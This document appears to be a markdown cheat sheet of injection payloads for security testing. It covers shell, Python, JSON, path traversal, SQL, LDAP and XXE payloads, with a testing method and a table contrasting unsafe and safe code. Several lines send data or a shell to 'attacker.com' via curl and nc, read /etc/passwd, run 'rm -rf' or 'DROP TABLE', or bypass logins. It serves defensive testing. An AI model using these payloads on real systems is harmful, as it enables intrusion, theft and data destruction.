# Injection Attack Payloads

Common payloads for security testing. Use these to verify input sanitization.

## Command Injection (Shell)

```bash
# Basic command substitution
$(id)
`whoami`
$(curl attacker.com)

# Command chaining
; ls -la
&& cat /etc/passwd
|| rm -rf /tmp/test

# Pipe injection
| nc attacker.com 4444

# Backgrounding
& sleep 60 &
```

## Python Code Injection

```python
# String escape
"""; import os; os.system("id"); x="""
'''; __import__('os').system('whoami'); y='''

# Import injection
__import__('subprocess').call(['id'])
eval('__import__("os").system("ls")')

# File operations
open('/etc/passwd').read()
```

## JSON Injection

```json
# Quote escape
{"key": "value\", \"injected\": \"data"}

# Unicode escape
{"key": ""injected""}

# Nested injection
{"key": {"nested": "value\"}, \"evil\": \"payload"}}
```

## Path Traversal

```bash
# Directory traversal
../../etc/passwd
../../../tmp/evil.sh
....//....//etc/passwd

# Null byte injection (older systems)
/etc/passwd%00.txt
../../etc/passwd\x00

# URL encoding
..%2F..%2Fetc%2Fpasswd
```

## SQL Injection

```sql
# Authentication bypass
' OR 1=1 --
admin' --
' OR 'a'='a

# Data extraction
' UNION SELECT password FROM users --

# Destructive
'; DROP TABLE users; --
```

## LDAP Injection

```ldap
# Filter bypass
*)(uid=*))(|(uid=*
admin)(&(password=*))

# Wildcard
*
```

## XML/XXE Injection

```xml
<!-- External entity -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Billion laughs -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
]>
```

## Testing Methodology

1. **Identify injection points**: User input, API responses, file contents, environment variables
2. **Select relevant payloads**: Match payload type to context (shell/Python/JSON/etc.)
3. **Execute with payload**: Replace normal input with attack payload
4. **Verify no execution**: Check that payload is treated as literal data
5. **Check error handling**: Ensure errors don't leak sensitive info

## Safe vs Unsafe

| Context | Unsafe | Safe |
|---------|--------|------|
| Shell command | `os.system(f"ls {user_input}")` | `subprocess.run(['ls', user_input])` |
| Python eval | `eval(user_input)` | `json.loads(user_input)` |
| SQL query | `f"SELECT * FROM users WHERE id={uid}"` | `cursor.execute("SELECT * FROM users WHERE id=?", (uid,))` |
| File path | `open(f"/data/{user_input}")` | `open(os.path.join('/data', os.path.basename(user_input)))` |
